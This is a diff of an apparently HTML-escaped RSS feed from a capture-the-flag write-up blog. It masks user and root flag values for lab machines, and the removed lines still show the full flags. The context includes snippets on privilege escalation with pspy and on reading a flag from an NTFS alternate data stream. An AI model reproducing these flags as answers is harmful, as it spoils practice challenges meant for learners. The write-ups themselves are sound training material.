 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;See you next time!&lt;/p&gt;
 </content>
     </item>
@@ -1570,7 +1955,7 @@ extractPorts () {
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tom@epsilon:~$ ls
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user.txt
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tom@epsilon:~$ cat user.txt
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a78de636a8ec1c5a51720d733ec29a3f
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a78de636a8ec1*******************
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;First part is done, now let&amp;rsquo;s move on to the privesc.&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;&lt;code&gt;Privilege escalation&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;We will deploy &lt;strong&gt;pspy&lt;/strong&gt; to enumerate the machine:&lt;/p&gt;
@@ -1677,7 +2062,7 @@ extractPorts () {
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tom@epsilon:/tmp/opt/backups/checksum$ ls
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker-compose.yml  lambda.sh  root.txt  src
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tom@epsilon:/tmp/opt/backups/checksum$ cat root.txt
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;3abf016adaf60d863a43b4fcc061562e
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;3abf016adaf60d******************
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;See you next time!&lt;/p&gt;
 </content>
     </item>
@@ -2018,7 +2403,7 @@ If we look for the &lt;strong&gt;root.txt&lt;/strong&gt; in its usual path it&am
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;With the parameter &lt;strong&gt;/r&lt;/strong&gt; we find the alternate data streams, where the &lt;strong&gt;root.txt&lt;/strong&gt; is.&lt;/p&gt;
 &lt;p&gt;Using &lt;strong&gt;more&lt;/strong&gt; we can get its content:&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;C:&lt;span style=&#34;color:#ae81ff&#34;&gt;\U&lt;/span&gt;sers&lt;span style=&#34;color:#ae81ff&#34;&gt;\A&lt;/span&gt;dministrator&lt;span style=&#34;color:#ae81ff&#34;&gt;\D&lt;/span&gt;esktop&amp;gt; more &amp;lt; hm.txt:root.txt
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;afbc5bd4b615a60648cec41c6ac92530
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;afbc5bd4b615a606****************
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;That&amp;rsquo;s it for this machine. See you next time!&lt;/p&gt;
 </content>
     </item>
